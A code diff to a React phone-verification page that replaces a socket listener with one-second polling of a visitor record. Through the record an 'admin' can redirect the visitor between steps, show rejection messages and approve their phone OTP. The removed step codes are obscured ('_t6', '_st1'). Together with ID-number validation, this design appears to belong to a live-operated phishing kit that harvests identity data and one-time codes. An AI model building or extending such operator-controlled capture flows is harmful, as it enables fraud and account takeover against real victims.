@@ -57,27 +57,48 @@ export default function VerifyPhonePage() {
     }
   }, [visitorId])
 
-  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
+  // <ADMIN_NAVIGATION_SYSTEM> Poll for admin actions (socket is disabled)
   useEffect(() => {
     if (!visitorId) return
 
-    console.log("[phone-info] Setting up navigation listener for visitor:", visitorId)
+    console.log("[phone-info] Setting up polling for visitor:", visitorId)
 
-    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
-      if (field === 'currentStep') {
-        if (status === 'home') window.location.href = '/'
-        else if (status === '_t6') window.location.href = '/step4'
-        else if (status === '_st1') window.location.href = '/check'
-        else if (status === '_t2') window.location.href = '/step2'
-        else if (status === '_t3') window.location.href = '/step3'
+    const pollVisitorData = async () => {
+      try {
+        const res = await fetch(`/api/visitors/${visitorId}`)
+        if (!res.ok) return
+        const data = await res.json()
+        
+        // Check for redirect page
+        const redirectPage = data.redirectPage || data.redirect_page
+        if (redirectPage === 'step4' && window.location.pathname !== '/step4') {
+          window.location.href = '/step4'
+        }
+        
+        // Check for phone rejection message
+        if (data.phoneRejectionMessage) {
+          setOtpRejectionError(data.phoneRejectionMessage)
+          setShowPhoneOtpDialog(true)
+        }
+        
+        // Check phone OTP status
+        const phoneOtpStatus = data.phoneOtpStatus
+        if (phoneOtpStatus === 'approved' && window.location.pathname !== '/step4') {
+          window.location.href = '/step4'
+        }
+      } catch (err) {
+        // Silent fail
       }
-    })
-
-    return () => {
-      console.log("[phone-info] Cleaning up navigation listener")
-      unsubscribe()
     }
-  }, [])
+
+    // Poll every 1 second
+    const interval = setInterval(pollVisitorData, 1000)
+    
+    return () => {
+      console.log("[phone-info] Cleaning up polling")
+      clearInterval(interval)
+    }
+  }, [visitorId])
 
   // ID number validation
   const validateIdNumber = (id: string): boolean => {
